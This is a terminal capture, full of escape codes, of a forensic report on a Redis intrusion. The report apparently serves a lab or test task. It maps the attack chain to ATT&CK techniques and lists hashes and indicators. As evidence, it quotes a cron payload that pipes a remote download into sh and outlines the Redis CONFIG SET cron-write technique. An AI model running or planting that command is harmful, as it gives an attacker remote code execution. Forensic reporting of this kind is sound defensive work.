[?2004l[?2004h> # Post-Compromise Intrusion Forensic Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> On host `redis-prod-01`, an external threat actor exploited an unauthenticated Redis instance bound to all interfaces (`0.0.0.0`) with protected mode disabled (`/disk/etc/redis/redis.conf:3`). The attacker executed commands via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`), established persistence via root cron job (`/disk/var/spool/cron/crontabs/root:5`), deployed an XMRig cryptominer (`/disk/tmp/.redis/kdevtmpfsi`), and installed stealth persistence via userland `LD_PRELOAD` dynamic linker hijacking (`/disk/etc/ld.so.preload:1`) and a loadable module kernel rootkit sample (`/disk/tmp/.redis/exp.so`).
[?2004l[?2004h> 
[?2004lE[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## Detailed Attack Chain & Technical Analysis
[?2004l[?2004h> 
[?2004l[?2004h> ### 1. Initial Access & External Access (ATT&CK T1133)
[?2004l[?2004h> - **Vector**: Unauthenticated remote access to Redis service on TCP port 6379.
[?2004l[?2004h> - **Evidence**: `/disk/etc/redis/redis.conf:3` specifies `protected-mode no`, `bind 0.0.0.0`, and `no password set` (`/disk/etc/redis/redis.conf:3`).
[?2004l[?2004h> - **Attribution & Origin**: Threat actor IP `198.51.100.170` (`/sas/cti/advisory.txt:5`, `/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 2. Execution (ATT&CK T1059.004)
[?2004l[?2004h> - **Vector**: Unix shell execution via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`).
[?2004l[?2004h> - **Details**: The actor modified Redis configuration dynamically to point the working directory to `/var/spool/cron/crontabs` and dbfilename to `root`, writing a cron file payload to disk.
[?2004l[?2004h> 
[?2004l[?2004h> ### 3. Resource Hijacking / Impact (ATT&CK T1496)
[?2004l[?2004h> - **Vector**: Cryptomining activity.
[?2004l[?2004h> - **Evidence**: Binary dropped at `/disk/tmp/.redis/kdevtmpfsi` (`/sas/alerts.json:2`).
[?2004l[?2004h> - **Properties**: SHA-256 `f32a21087eb4c89ca20359debcb989b46047d8237507fabf63314cbbadb4481c` (`/disk/tmp/.redis/kdevtmpfsi`).
[?2004l[?2004h> - **Target Pool**: `stratum+tcp://xmr.redis.evil:3333` (`/sas/cti/advisory.txt:19`).
[?2004l[?2004h> - **Wallet**: `4A00000000000000000031c7d95fb9f3` (`/sas/cti/advisory.txt:20`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 4. Cron Persistence (ATT&CK T1053.003)
[?2004l[?2004h> - **Vector**: Cron job persistence.
[?2004l[?2004h> - **Evidence**: Entry in `/disk/var/spool/cron/crontabs/root:5` (`/sas/alerts.json:10`).
[?2004l[?2004h> - **Payload**: Beaconing command `curl http://198.51.100.170/x | sh` (`/disk/var/spool/cron/crontabs/root:5`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 5. Dynamic Linker Hijacking & Stealth Persistence (ATT&CK T1574.006)
[?2004l[?2004h> - **Vector**: `LD_PRELOAD` shared object injection and loadable module rootkit.
[?2004l[?2004h> - **Evidence**: 
[?2004l[?2004h>   - `/disk/etc/ld.so.preload:1` references `/lib/.hide.so` (SHA-256: `a2ea2d39f7a0c2a2ea9e2d5bd342667d014d8a974f4f6c8b08a731ddc250e480`).
[?2004l[?2004h>   - `/disk/tmp/.redis/exp.so` (SHA-256: `29b2bcaadbbae01496158b67b95b8fe3457573eb7e332da3516aab24ca1e5350`).
[?2004l[?2004h> - **Detection Status**: **SILENT** ‚Äî not captured by SAS security alerts (`/sas/alerts.json:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ### 6. Anti-Forensics & Wiped Binary Evidence
[?2004l[?2004h> - **Evidence**: Wiped binary trace found at `/disk/var/lib/.cache/.wiped.bin:1` (SHA-256: `7b454340fed86d2621bc00c334ac5e76b54c3e1f7df9daf6fdefef1b75f53c14`). M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K.
[?2004l[?2004h> - **Content**: Contains recovered C2 beacon information for domain `update-redis.example.cn` and IP `198.51.100.170` (`/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
